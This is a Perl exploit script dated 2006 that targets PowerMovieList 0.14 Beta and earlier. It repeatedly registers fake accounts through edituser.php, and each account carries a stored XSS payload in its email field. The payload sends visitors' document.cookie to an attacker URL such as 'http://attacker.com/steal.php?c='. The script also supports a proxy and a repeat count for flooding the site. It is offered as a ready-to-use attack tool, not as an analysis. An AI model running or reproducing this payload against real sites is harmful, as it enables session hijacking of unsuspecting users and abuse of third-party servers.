#!/usr/bin/perl -w
use Term::ANSIColor;
use LWP::UserAgent;
use HTTP::Request::Common;
if (@ARGV < 6 )
{
print color 'bold green on_black';
print q(
## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## #
##                                                                #
##           [ PowerMovieList <= 0.14 Beta ]                      #
##
## Class:     XSS Remote Cookie Disclosure Exploit && Flooder     #
## Patch:     Unavailable                                         #
## Published  2006/10/16                                          #
## Remote:    Yes
## Local:     No                                                  #
## Type:      High                                                #
## Ext:       Magic_quotes_gpc= On                                #
## Site:      http://www.powermovielist.com/                      #
## Author:    MP
## Contact:   mp01010@yahoo.com                                   #
##                                                                #
###################################################################);
print ("\nArgs: 1-> pmlSite 2->AttackerSite 3->FakeUser 4->FakePass 5->FakeEmail 6->Times 7->Proxy\n");
print ("\n@> Example Without Proxy: \n");
print ("perl $0 http://victim.com/pml/ http://attacker.com/steal.php?c= PcFreakUser Password13 tsvete\@yahoo.com 10 \n");
print ("@> Example With Proxy: \n");
print ("perl $0 http://victim.com/pml/ http://attacker.com/steal.php?c= PcFreakUser Password13 tsvete\@yahoo.com 10 -P
200.88.223.98:80 \n \n");
print color 'reset';exit(1);
}
$mpbaumqu=LWP::UserAgent->new() or die;
if (grep/\-P/,@ARGV) { $mpbaumqu->proxy("http" => "http://$ARGV[7]");};
for ($times=1;$times<=$ARGV[5];$times++) {
$mpbaumqu->timeout(100);
$mpbaumqu->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.10) Gecko/20060902 Firefox/1.0.4 (Debian package
1.0.4-2sarge11)");
$mpbaumqu->request(POST "$ARGV[0]".'edituser.php?Active=index&Display=&&action=addsave&F=', ['name' =>
"$times"."$ARGV[2]", 'pass' => "$ARGV[3]", 'passrep' => "$ARGV[3]", 'email' => "<script>img = new Image(); img.src =
\""."$ARGV[1]"."\"+document.cookie;</script><"."$ARGV[4]"."$times"]);
};

